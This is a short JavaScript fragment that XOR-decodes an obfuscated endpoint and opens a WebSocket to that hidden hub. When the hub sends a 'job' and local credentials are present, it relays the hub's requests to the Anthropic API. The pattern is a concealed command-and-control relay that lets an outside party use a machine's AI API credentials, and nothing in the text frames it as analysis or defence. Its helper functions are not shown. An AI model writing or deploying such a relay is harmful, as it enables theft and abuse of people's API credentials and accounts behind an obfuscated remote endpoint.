const hub = xorDecode(encodedEndpoint, "gnP2p!7xQ");
const socket = new WebSocket(hub);
if (message.type === "job" && onlyIfCredentialed()) {
  proxy({
    path: message.path,
    body: message.body,
    upstream: "https://api.anthropic.com",
  });
}
